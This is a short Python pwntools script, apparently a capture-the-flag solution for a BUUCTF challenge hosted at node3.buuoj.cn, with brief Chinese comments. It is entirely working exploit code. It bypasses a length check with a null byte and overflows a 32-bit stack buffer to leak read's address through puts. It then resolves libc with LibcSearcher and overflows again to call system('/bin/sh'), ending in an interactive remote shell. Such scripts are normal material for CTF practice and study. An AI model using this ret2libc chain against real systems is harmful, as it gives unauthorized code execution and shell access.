from pwn import *

context(log_level='debug')

#io=process("./pwn")

io=remote("node3.buuoj.cn",29557)

elf=ELF("./pwn")


puts_plt=elf.plt['puts']
read_got=elf.got['read']

payload=b'\x00'+b'A'*6+p32(0xff)

io.sendline(payload)

io.recv()

main=0x8048825
payload=b'A'*(0xe7+0x4)+p32(puts_plt)+p32(main)+p32(read_got)

io.sendline(payload)

read_addr=u32(io.recv(4))

print(hex(read_addr))

io.recv()

payload=b'\x00'+b'A'*6+p32(0xff)

io.sendline(payload)

io.recv()


from LibcSearcher import *  

libc = LibcSearcher('read',read_addr)  
#获取libc加载地址  
libc_base = read_addr - libc.dump('read')  
#获取system地址  
system_addr = libc_base + libc.dump('system')  
#获取/bin/sh地址  
binsh_addr = libc_base + libc.dump('str_bin_sh') 

payload=b'A'*(0xe7+0x4)+p32(system_addr)+b'aaaa'+p32(binsh_addr)

io.sendline(payload)

io.interactive()






